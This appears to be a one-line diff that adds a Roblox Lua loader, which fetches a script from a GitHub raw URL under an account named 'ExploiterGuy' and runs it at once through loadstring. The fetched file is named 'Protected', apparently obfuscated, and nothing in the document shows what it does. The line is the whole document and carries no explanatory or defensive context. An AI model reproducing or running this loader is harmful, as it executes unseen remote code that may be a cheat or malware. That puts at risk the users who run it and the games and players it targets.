@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/FBC/refs/heads/main/Protected_3203896199155968.txt"))()
